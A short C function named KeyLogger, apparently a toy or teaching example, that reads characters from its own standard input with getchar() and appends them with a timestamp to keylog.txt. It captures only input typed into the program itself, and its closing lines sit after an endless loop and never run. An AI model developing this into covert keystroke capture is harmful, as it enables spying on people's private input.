int KeyLogger() {
    FILE *fp;
    char c;
    time_t t;
    fp = fopen("keylog.txt", "a"); // open the file in append mode
    if (fp == NULL) { // if the file could not be opened
        printf("Error opening file\n");
        return -1;
    }
    else{
        printf("keylog.txt has been opened successfully\n");
    }

    t = time(NULL); // get the current time
    fprintf(fp, "Timestamp: %s\n", ctime(&t)); // write the timestamp to the file

    while (1) { // run indefinitely
        c = getchar(); // get a character from the keyboard
        fputc(c, fp); // write the character to the file
        fflush(fp); // flush the output to the file
    }

    printf("Keylogger stopped and keystroke has been saved in keylog.txt\n");
    fclose(fp); // close the file

    return 0;

}